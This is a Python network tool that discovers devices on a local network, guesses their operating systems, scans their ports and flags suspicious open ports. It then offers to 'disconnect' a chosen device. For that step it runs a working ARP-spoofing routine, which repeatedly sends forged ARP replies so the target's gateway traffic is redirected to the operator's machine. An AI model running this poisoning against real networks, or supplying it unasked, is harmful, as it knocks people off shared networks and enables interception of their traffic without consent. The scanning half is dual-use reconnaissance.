import socket
import threading
import subprocess
from scapy.all import ARP, Ether, srp, IP, ICMP, TCP, sr1, get_if_hwaddr, conf, sendp, send
import os
import time


# Load OUI database from oui.txt
def load_oui_database(file_path="oui.txt"):
    """
    Loads the OUI database and maps MAC prefixes to manufacturers.
    """
    oui_dict = {}
    try:
        with open(file_path, "r", encoding="utf-8") as file:
            for line in file:
                if "(hex)" in line:  # Only process lines containing "(hex)"
                    parts = line.split("\t")
                    if len(parts) > 1:
                        mac_prefix = parts[0].split(" ")[0].strip().upper()  # Extract MAC prefix
                        mac_prefix = mac_prefix.replace("-", ":")  # Ensure format consistency
                        vendor_name = parts[-1].strip()
                        oui_dict[mac_prefix] = vendor_name
    except FileNotFoundError:
        print("⚠️ Error: OUI file not found! Please download it from IEEE and place it in the script folder.")
    except Exception as e:
        print(f"⚠️ Error loading OUI database: {e}")
    
    return oui_dict

# TTL-Based OS Mapping
TTL_OS_MAPPING = {
    32: "Windows 95/98/ME",
    64: "Linux/macOS/Android",
    128: "Windows",
    255: "Cisco/Unix-like"
}

def get_mac_fallback(ip):
    try:
        ans = sr1(IP(dst=ip)/TCP(dport=80, flags="S"), timeout=1, verbose=False)
        if ans and ans.haslayer(Ether):
            return ans.src  # Return MAC if available
    except:
        pass
    return "Unknown MAC"

def find_router_ip(network):
    """
    Sends an ARP request to all devices and finds the most likely router IP.
    """
    arp_request = ARP(pdst=network)
    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = broadcast / arp_request

    answered_list = srp(packet, timeout=2, verbose=False)[0]

    mac_count = {}  # Track MAC address occurrences

    for sent, received in answered_list:
        mac_count[received.hwsrc] = mac_count.get(received.hwsrc, 0) + 1

    # Find MAC with most connections (likely the router)
    if mac_count:
        likely_router_mac = max(mac_count, key=mac_count.get)
        for sent, received in answered_list:
            if received.hwsrc == likely_router_mac:
                return received.psrc  # Return the router's IP

    return None

def get_router_ip():
    """
    Retrieves the default gateway using system commands.
    """
    try:
        if os.name == "nt":  # Windows
            result = os.popen("ipconfig").read()
            for line in result.split("\n"):
                if "Default Gateway" in line and (line.split(":")[-1].strip()) != "":
                    return line.split(":")[-1].strip()
        else:  # Linux/macOS
            result = os.popen("ip route").read()
            for line in result.split("\n"):
                if "default via" in line:
                    return line.split(" ")[2]
    except Exception as e:
        return f"Error detecting router: {e}"

    return None

def detect_os(ip):
    """
    Detect OS based on the TTL value of an ICMP or TCP response.
    """
    try:
        # Send an ICMP Echo Request (Ping)
        icmp_packet = IP(dst=ip) / ICMP()
        response = sr1(icmp_packet, timeout=1, verbose=False)

        if response:
            ttl = response.ttl
            return TTL_OS_MAPPING.get(ttl, f"Unknown (TTL={ttl})")

        # If ICMP fails, try a TCP SYN packet to port 80 (common open port)
        tcp_packet = IP(dst=ip) / TCP(dport=80, flags="S")
        response = sr1(tcp_packet, timeout=1, verbose=False)

        if response:
            ttl = response.ttl
            return TTL_OS_MAPPING.get(ttl, f"Unknown (TTL={ttl})")

    except Exception as e:
        print(f"Error detecting OS for {ip}: {e}")

    return "Unknown"

def resolve_hostname(ip):
    """Attempts to resolve the hostname of a device."""
    try:
        return socket.gethostbyaddr(ip)[0]
    except (socket.herror, socket.gaierror):
        return "Unknown Host"

def get_device_vendor(mac_address, oui_database):
    """
    Returns the vendor name for a given MAC address.
    """
    mac_prefix = mac_address.upper()[:8]  # Extract first 8 characters (xx:xx:xx)
    return oui_database.get(mac_prefix, "Unknown Device")

    

def scan_network_nmap(network):
    print(f"Running Nmap scan on {network}...")
    devices = []
    try:
        result = subprocess.run(["nmap", "-sn", network], capture_output=True, text=True)
        lines = result.stdout.split("\n")
        ip, mac = None, None
        for line in lines:
            if "Nmap scan report for" in line:
                ip = line.split()[-1]
            elif "MAC Address:" in line:
                parts = line.split()
                mac = parts[2] if len(parts) > 2 else None
                if not mac:  # If MAC is still None, use fallback method
                    mac = get_mac_fallback(ip)
                vendor = " ".join(parts[3:]).replace("(", "").replace(")", "").strip()
                vendor = vendor if vendor else "Unknown Device"
                os_detected = detect_os(ip)
                hostname = resolve_hostname(ip)
                devices.append({"ip": ip, "mac": mac, "vendor": vendor , "os": os_detected, "hostname": hostname})
    except Exception as e:
        print(f"Error running Nmap: {e}")
    return devices

# Scan network to find active devices
def scan_network_arp(network, oui_database):
    """
    Scans the network to discover active devices and identifies their manufacturers.
    """
    print(f"Scanning network {network}...")
    
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp

    result = srp(packet, timeout=4, retry=2, verbose=False)[0]

    devices = []
    for _, received in result:
        mac_address = received.hwsrc if received.hwsrc else get_mac_fallback(received.psrc)
        vendor = get_device_vendor(mac_address, oui_database)
        os_detected = detect_os(received.psrc)
        hostname = resolve_hostname(received.psrc)
        devices.append({"ip": received.psrc, "mac": mac_address, "vendor": vendor, "os": os_detected, "hostname": hostname})

    return devices

# Scan ports on a device
def scan_ports(ip):
    """
    Scans important ports on a specific device to find open ports.
    """
    # Default port range (1-1024) + high-risk ports
    ports_to_scan = list(range(1, 1025)) + [1080, 4444, 5555, 6667, 8080, 4443]
    
    open_ports = []

    def scan_port(port):
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(1)
                result = s.connect_ex((ip, port))
                if result == 0:
                    open_ports.append(port)
        except Exception:
            pass

    threads = []
    for port in ports_to_scan:
        t = threading.Thread(target=scan_port, args=(port,))
        threads.append(t)
        t.start()

    for t in threads:
        t.join()

    print(f"Open ports on {ip}: {open_ports}")
    return open_ports

# Detect anomalies in the network
def detect_anomalies(devices):
    """
    Identifies potential anomalies in the network based on unknown devices and unusual open ports.
    """
    common_malicious_ports = {23, 1080, 4444, 5555, 6667, 8080, 4443}  # Ports used by malware/botnets
    anomalies = []

    print("\nAnalyzing network for anomalies...\n")
    for device in devices:
        ip = device['ip']
        mac = device['mac']
        vendor = device['vendor']
        open_ports = device.get('open_ports', [])

        # Flag unknown devices
        if vendor == "Unknown Device" or vendor == "Unknown":
            anomalies.append(f"⚠️ Unknown Device Detected - IP: {ip}, MAC: {mac}")

        # Flag devices with multiple open ports
        if len(open_ports) > 10:
            anomalies.append(f"⚠️ Device {ip} has unusually high open ports: {open_ports}")

        # Flag suspicious ports
        for port in open_ports:
            if port in common_malicious_ports:
                anomalies.append(f"⚠️ Suspicious Port {port} open on {ip}")

    if anomalies:
        print("\n⚠️ Potential Anomalies Found:\n")
        for anomaly in anomalies:
            print(anomaly)
    else:
        print("\n✅ No anomalies detected in the network.")

    return anomalies

# Save results to file
def save_results_to_file(devices, anomalies):
    """
    Saves the scan results and detected anomalies to a file.
    """
    filename = "scan_results.txt"
    with open(filename, "w", encoding="utf-8") as file:
        for device in devices:
            file.write(f"Device IP: {device['ip']}, MAC: {device['mac']}, Vendor: {device['vendor']}, OS: {device['os']} \t Hostname: {device['hostname']}, Open Ports: {device.get('open_ports', [])}\n")

        if anomalies:
            file.write("\nDetected Anomalies:\n")
            for anomaly in anomalies:
                file.write(anomaly + "\n")

    print(f"\n📁 Scan results and anomalies saved to {filename}")

def restore_arp(target_ip, target_mac, router_ip, router_mac):
    if router_mac and target_mac:
        restore_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=router_mac)
        restore_ether_packet = Ether(dst=target_mac) / restore_packet
        sendp(restore_ether_packet, count=5, verbose=False)
        print(f"✅ Restored ARP table for {target_ip}")

def arp_spoof(target_ip, target_mac, router_ip, our_mac, router_mac): 
    print(f"⚡ Poisoning {target_ip} to redirect traffic meant for {router_ip} to {our_mac}")
    # Construct the malicious ARP reply
    arp_packet = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip, hwsrc=our_mac)
    ether_packet = Ether(dst=target_mac) / arp_packet
    try:
        while True:
            #send(arp_packet, verbose=False)
            sendp(ether_packet, verbose=False)
            time.sleep(2)  # Send packets every 2 seconds to keep poisoning active
    except KeyboardInterrupt:
        print("\n⚠️ Stopping ARP Spoofing.")
        restore_arp(target_ip, target_mac, router_ip, router_mac)

# Main function
def main():
    network = input("Enter the network range to scan (e.g., 192.168.1.0/24): ")
    oui_data = load_oui_database()
    nmap_devices = scan_network_nmap(network)
    arp_devices = scan_network_arp(network, oui_data)
    devices = {d['ip']: d for d in nmap_devices}
    for device in arp_devices:
        if device['ip'] not in devices:
            devices[device['ip']] = device
    devices = list(devices.values())
    print("Discovered devices:")
    dev_num = 1
    for device in devices:
       print(f"{dev_num}. IP: {device['ip']}\n   MAC: {device['mac']}\n   Vendor: {device['vendor']}\n   OS: {device['os']}\n   Hostname: {device['hostname']}\n")
       dev_num += 1
    for device in devices:
       ip = device['ip']
       open_ports = scan_ports(ip)
       device['open_ports'] = open_ports
    anomalies = detect_anomalies(devices)
    save_results_to_file(devices, anomalies)
    choice_var = input("\n🔍 Scan completed! Would you like to attempt to disconnect a device from the network? (yes/no): ")
    if choice_var in ["y", "Y", "yes", "YES"]:
        if get_router_ip() != None:
            router_ip = get_router_ip()
        elif find_router_ip(network) != None:
            router_ip = find_router_ip(network)
        else:
            router_ip = str(input("\nEnter the Router-IP address: "))
        router_mac = ""
        for device in devices:
            if device['ip'] == router_ip:
                router_mac = device['mac']
        if router_mac == "":
            router_mac = str(input("\nEnter the MAC address of the router: "))
        
        target_id = int(input("\nSelect the device to target:"))-1
        target_ip = devices[target_id]['ip']
        target_mac = devices[target_id]['mac']
        try:
            our_mac = get_if_hwaddr(conf.iface)
        except:
            our_mac = str(input("\nEnter the MAC address of this device: "))
         
        arp_spoof(target_ip, target_mac, router_ip, our_mac, router_mac)
            # print(f"\ntarget_ip: {target_ip}\n target_mac: {target_mac}\n router_ip: {router_ip}\n our_mac: {our_mac}\n router_mac: {router_mac}")
            
    else:
        print("✅ No action taken. Exiting...")

if __name__ == "__main__":
    main()
